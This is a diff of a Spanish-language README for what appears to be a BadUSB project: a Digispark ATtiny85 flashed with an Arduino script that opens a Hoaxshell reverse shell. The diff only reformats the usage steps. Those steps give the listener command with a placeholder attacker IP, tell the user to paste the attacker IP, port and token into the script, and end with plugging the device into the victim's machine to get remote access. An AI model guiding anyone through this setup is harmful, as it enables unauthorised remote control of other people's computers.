@@ -31,14 +31,14 @@ git clone https://github.com/t3l3machus/hoaxshell
 
 ## 🚀 Uso
 
-1. Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
+### 1) Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
 ```python
 python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 ```
 ![image](https://github.com/user-attachments/assets/8da49bb0-b57a-4613-9a5a-1bc4f6299157)
 
 
-2. Abrir Arduino con el script, modificar las variables y seleccionar Digispark 16.5 Board:
+### 2) Abrir Arduino con el script, modificar las variables y seleccionar Digispark 16.5 Board:
 
 - IP_AND_PORT_ATTACKER: Pegar tu IP y puerto de maquina atacante
 - TOKEN: Pegar el token generado por hoaxshell
@@ -50,11 +50,10 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 
 
 
-3. Compilar y cargar a nuestro ATTINY-85
+### 3) Compilar y cargar a nuestro ATTINY-85 en la misma interfaz de Arduino
 
-4. Conectar el dispositivo a la máquina victima y esperamos la respuesta en nuestra máquina de atacante.
+### 4) Conectar el dispositivo a la máquina victima y esperamos la respuesta en nuestra máquina de atacante.
 
-5. Pwned!
    
 ![image](https://github.com/user-attachments/assets/5c8ce65b-5abe-4dae-a521-7f1f90dc95a5)
 
